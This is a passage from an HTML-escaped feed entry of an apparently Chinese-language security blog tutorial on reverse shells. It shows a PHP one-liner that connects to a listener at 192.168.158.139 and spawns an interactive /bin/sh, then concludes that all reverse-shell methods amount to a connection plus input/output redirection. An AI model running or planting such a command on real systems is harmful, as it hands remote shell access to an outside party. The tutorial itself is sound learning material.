&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443647/Typera/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png&#34; alt=&#34;image-20230426012721830&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;用-php-脚本反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用-php-脚本反弹-shell&#34;&gt;#&lt;/a&gt; 用 php 脚本反弹 Shell&lt;/h2&gt;
&lt;p&gt;攻击侧开启监听，目标机执行的 php 脚本如下：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.158.139&amp;quot;,23333);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 实现如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443639/Typera/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png&#34; alt=&#34;image-20230426012715771&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443627/Typera/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png&#34; alt=&#34;image-20230426012702683&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;最后&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最后&#34;&gt;#&lt;/a&gt; 最后&lt;/h2&gt;
&lt;p&gt;逐一实现了这么多的 &lt;strong&gt;反弹 Shell&lt;/strong&gt; 的方法，我发现他们本质上都是一致的。&lt;/p&gt;
&lt;p&gt;无论是用工具还是脚本，都是 建立连接 + 输入输出重定向。&lt;/p&gt;
&lt;p&gt;总得来说，这样一遍下来，最开始读起来较为模糊的原理，现在也能够清晰地理解了。&lt;/p&gt;
</content>
        <category term="Linux" />
        <category term="Kali" />
        <category term="Reverse Shell" />
        <updated>2022-04-23T13:48:27.000Z</updated>
    </entry>
</feed>
